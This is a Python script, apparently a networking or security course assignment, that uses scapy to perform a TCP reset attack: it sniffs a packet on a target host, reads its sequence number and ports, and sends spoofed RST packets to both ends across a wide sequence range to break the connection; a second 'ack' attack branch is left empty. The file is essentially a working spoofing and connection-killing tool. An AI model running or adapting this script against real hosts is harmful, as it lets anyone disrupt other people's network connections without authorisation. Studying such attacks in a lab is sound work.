import sys

import scapy.all as scapy
scapy.conf.use_pcap = True

if __name__ == "__main__":

    argc = len(sys.argv)

    if argc != 5:

        print("Usage: python3 task2.py <source_addr> <dest_addr> <dest_port> <attack>", file=sys.stderr)

        sys.exit(1)

    source_addr = sys.argv[1]
    dest_addr = sys.argv[2]
    dest_port = int(sys.argv[3])
    attack = sys.argv[4]

    if attack.lower() == "rst":
        # Creating a tcpserver socket

        #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # Binding the socket to a public host, and a well-known port

        #s.connect((dest_addr, dest_port))

        # Send tcp RST packet using scapy

        print("Assuming this is blocking")
        capture = scapy.sniff(filter="tcp and host " + dest_addr, count=1)
        print("Captured packet")
        capture.summary()
        # Extract TCP sequence number from the captured packet
        seq = capture[0].seq
        # Get the captured packet's source port
        sport = capture[0].sport
        dport = capture[0].dport

        tcp = capture[0].getlayer(scapy.TCP)
        tcp.flags = "R"

        for i in range(seq, seq + 10000000, 10000):
            # Create a TCP packet with RST flag set
            tcp.seq = i

            tcp_to_dest = tcp.copy()
            tcp_to_dest.dport = dport
            tcp_to_dest.flags = "R"
            rst_to_dest = scapy.IP(src=source_addr, dst=dest_addr)/tcp_to_dest

            tcp_to_src = tcp.copy()
            tcp_to_src.dport = sport
            tcp_to_src.flags = "R"
            rst_to_src = scapy.IP(src=dest_addr, dst=source_addr)/tcp_to_src
            
            # Send the packet
            scapy.send(rst_to_dest)
            scapy.send(rst_to_src)
            print("Sent packet with seq: " + str(i))


        # for i in range(seq, seq + 10000000, 10000):
        #     # Create a TCP packet with RST flag set
        #     rst = scapy.IP(src=source_addr, dst=dest_addr)/scapy.TCP(sport=sport, dport=dest_port, flags="R", seq=i)
            
        #     # Send the packet
        #     scapy.send(rst)
        #     print("Sent packet with seq: " + str(i))


        # p = scapy.IP(src=source_addr, dst=dest_addr)/scapy.TCP(sport=dest_port, dport=dest_port, flags="R", seq=seq+5000)
        # print(p.show())
        # scapy.send(p)

    elif attack.lower() == "3ack":
        pass